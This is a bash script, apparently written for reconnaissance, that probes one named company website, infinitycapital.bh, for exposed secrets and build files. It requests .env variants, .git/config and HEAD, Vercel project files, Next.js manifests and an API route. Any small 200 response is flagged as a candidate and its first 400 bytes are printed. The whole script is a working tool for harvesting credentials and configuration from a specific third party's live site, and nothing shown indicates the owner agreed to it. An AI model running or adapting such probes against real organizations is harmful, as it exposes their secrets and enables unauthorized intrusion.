#!/bin/bash
# Hunt for exposed build artifacts / config / secrets in the Next.js deployment
H='https://www.infinitycapital.bh'
C=("$H/.env" "$H/.env.local" "$H/.env.production" "$H/.git/config" "$H/.git/HEAD" "$H/next.config.js"
   "$H/next.config.mjs" "$H/package.json" "$H/.vercel/project.json" "$H/_next/static/BUILD_ID"
   "$H/_next/routes-manifest.json" "$H/_next/build-manifest.json" "$H/_next/server/pages-manifest.json"
   "$H/_next/prerender-manifest.json" "$H/_next/server/app-paths-manifest.json"
   "$H/_next/static/development/_buildManifest.js" "$H/_next/static/chunks/webpack-e401313d27ef7f61.js"
   "$H/_next/static/chunks/main-app-2dcde4753ea0d175.js" "$H/robots.txt" "$H/sitemap.xml"
   "$H/.well-known/security.txt" "$H/vercel.json" "$H/api/send/route.js")
for u in "${C[@]}"; do
  printf "%-72s " "${u#$H}"
  code=$(curl -s -m 20 -o /tmp/z -w "%{http_code}" "$u")
  sz=$(wc -c < /tmp/z)
  # distinguish real artifact from catch-all shell: real artifacts have small/odd sizes
  printf "%s|%s" "$code" "$sz"
  if [ "$code" = "200" ] && [ "$sz" -lt 25000 ]; then
    echo "   <<< CANDIDATE"; head -c 400 /tmp/z | tr -d '\n'; echo
  else
    echo
  fi
done
